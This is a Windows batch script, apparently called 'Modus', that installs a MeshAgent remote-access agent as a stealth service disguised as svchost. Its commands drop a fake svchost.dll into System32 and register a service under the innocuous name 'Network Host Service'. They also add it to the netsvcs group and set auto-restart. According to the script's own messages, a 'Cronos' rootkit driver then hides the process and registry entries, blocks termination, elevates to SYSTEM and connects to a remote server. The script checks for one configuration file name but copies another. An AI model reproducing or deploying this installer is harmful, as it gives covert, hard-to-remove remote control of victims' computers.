@echo off
REM ============================================================================
REM Modus - Stealth MeshAgent Service Installation Script
REM ============================================================================
REM Author: Joel Aaron Guff
REM Version: 1.0
REM
REM This script installs the MeshAgent as a stealth service running in svchost.exe
REM 
REM Requirements:
REM - Administrative privileges
REM - Test signing mode enabled (bcdedit /set testsigning on)
REM - svchost.dll compiled and ready
REM
REM Service Configuration:
REM - Internal name: svchost_net
REM - Display name: Network Host Service  
REM - Runs in netsvcs group within svchost.exe
REM - Protected by Cronos rootkit driver
REM ============================================================================

echo Modus - Stealth MeshAgent Service Installer
echo ============================================

REM Check for administrative privileges
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo ERROR: This script must be run as Administrator
    echo Please right-click and select "Run as administrator"
    pause
    exit /b 1
)

echo [INFO] Administrative privileges confirmed

REM Verify test signing mode is enabled
bcdedit /enum | findstr "testsigning" | findstr "Yes" >nul
if %errorLevel% neq 0 (
    echo WARNING: Test signing mode may not be enabled
    echo The Cronos driver requires test signing mode
    echo Run: bcdedit /set testsigning on
    echo Then reboot and run this installer again
    set /p continue="Continue anyway? (y/N): "
    if /i not "%continue%"=="y" exit /b 1
)

echo [INFO] Test signing mode verified

REM Check if svchost.dll exists
if not exist "svchost.dll" (
    echo ERROR: svchost.dll not found in current directory
    echo Please compile the MeshService project first
    pause
    exit /b 1
)

echo [INFO] Found svchost.dll

REM Check if MSH configuration file exists
if not exist "svchost.msh" (
    echo ERROR: svchost.msh configuration file not found
    echo Please customize the svchost.msh file with your MeshCentral server details
    echo See MODUS_README.md for configuration instructions
    pause
    exit /b 1
)

echo [INFO] Found svchost.msh configuration

REM Stop existing service if running
echo [INFO] Stopping any existing MeshAgent services...
sc stop "Mesh Agent" >nul 2>&1
sc stop "svchost_net" >nul 2>&1
timeout /t 2 /nobreak >nul

REM Copy DLL to system directory
echo [INFO] Installing svchost.dll to System32...
copy /y "svchost.dll" "%SystemRoot%\system32\svchost.dll"
if %errorLevel% neq 0 (
    echo ERROR: Failed to copy svchost.dll to System32
    pause
    exit /b 1
)

REM Copy MSH configuration to secure location
echo [INFO] Installing taskmaster.msh configuration...
copy /y "taskmaster.msh" "%SystemRoot%\system32\taskmaster.msh"
if %errorLevel% neq 0 (
    echo ERROR: Failed to copy taskmaster.msh to System32
    pause
    exit /b 1
)

REM Create the svchost_net service
echo [INFO] Creating Network Host Service...
sc create svchost_net type= share start= auto group= netsvcs binPath= "%SystemRoot%\system32\svchost.exe -k netsvcs" DisplayName= "Network Host Service"
if %errorLevel% neq 0 (
    echo ERROR: Failed to create service
    pause
    exit /b 1
)

REM Add service registry parameters
echo [INFO] Configuring service registry entries...
reg add "HKLM\SYSTEM\CurrentControlSet\Services\svchost_net\Parameters" /v ServiceDll /t REG_EXPAND_SZ /d "%SystemRoot%\system32\svchost.dll" /f
if %errorLevel% neq 0 (
    echo ERROR: Failed to add ServiceDll registry entry
    pause
    exit /b 1
)

REM Add service to netsvcs group
echo [INFO] Adding service to netsvcs group...
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost" /v netsvcs | findstr "svchost_net" >nul
if %errorLevel% neq 0 (
    for /f "tokens=3*" %%a in ('reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost" /v netsvcs ^| findstr "REG_MULTI_SZ"') do (
        reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost" /v netsvcs /t REG_MULTI_SZ /d "%%a %%b svchost_net" /f
    )
)

REM Set service failure actions to restart
echo [INFO] Configuring service recovery options...
sc failure svchost_net reset= 86400 actions= restart/5000/restart/5000/restart/5000

REM Start the service
echo [INFO] Starting Network Host Service...
sc start svchost_net
if %errorLevel% neq 0 (
    echo WARNING: Service created but failed to start
    echo This may be normal on first run - the service will extract and load the Cronos driver
    echo Check Windows Event Log for details
) else (
    echo [SUCCESS] Network Host Service started successfully
)

echo.
echo ============================================================================
echo Installation Complete!
echo ============================================================================
echo.
echo Service Information:
echo   Name: svchost_net
echo   Display: Network Host Service
echo   Status: Use 'sc query svchost_net' to check status
echo.
echo Configuration:
echo   DLL: %SystemRoot%\system32\svchost.dll
echo   Config: %SystemRoot%\system32\taskmaster.msh
echo   Driver: %SystemRoot%\system32\drivers\CronosRootkit.sys
echo.
echo The service will:
echo   1. Load MSH configuration from taskmaster.msh
echo   2. Extract and load the Cronos rootkit driver
echo   3. Hide its process in Task Manager (appears as svchost.exe)
echo   4. Protect itself from termination
echo   5. Elevate to SYSTEM privileges
echo   6. Hide registry entries from regedit
echo   7. Connect to your MeshCentral server
echo.
echo SECURITY WARNING:
echo This creates a protected service that may be difficult to remove
echo Use the provided cleanup script to uninstall safely
echo.
pause
